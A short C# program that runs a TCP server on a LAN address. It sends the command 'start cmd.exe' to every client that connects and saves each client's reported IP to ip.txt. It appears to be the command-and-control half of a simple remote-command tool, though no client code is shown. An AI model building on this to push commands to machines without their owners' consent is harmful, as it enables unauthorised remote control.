using System;
using System.IO;
using System.Net;
using System.Net.Sockets;

namespace TCPListener
{
    internal class Program
    {
        static void Main(string[] args)
        {
            TcpListener server = null;

            try
            {
                // Initialisation
                byte[] clientIp = new byte[256];
                int numberIpBytes = 0;
                int port = 13000;
                string ip = string.Empty;
                IPAddress localIp = IPAddress.Parse("192.168.1.172");

                // Build the server
                server = new TcpListener(localIp, port);
                server.Start();

                TcpClient client = null;
                NetworkStream stream = null;

                // Do it for each client that connected
                while (true)
                {
                    client = server.AcceptTcpClient();
                    stream = client.GetStream();

                    // Transform command into bytes and puts it in the stream
                    string command = "start cmd.exe";
                    byte[] bytes = System.Text.Encoding.ASCII.GetBytes(command);


                    stream.Write(bytes, 0, bytes.Length);
                    Console.WriteLine("Message sent !");

                    // Get IP and create file but only if an IP has been returned
                    numberIpBytes = stream.Read(clientIp, 0, clientIp.Length);

                    if (numberIpBytes != 0)
                    {
                        ip = System.Text.Encoding.ASCII.GetString(clientIp);

                        Console.WriteLine("Client IP: " + ip);

                        string fileName = "ip.txt";

                        File.Delete(fileName);
                        File.Create(fileName).Close();
                        File.AppendAllText(fileName, ip + "\n");
                    }
                    else
                    {
                        Console.WriteLine("No IP was found");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine("Error: " + ex.Message);
            }
            Console.ReadLine();
        }
    }
}
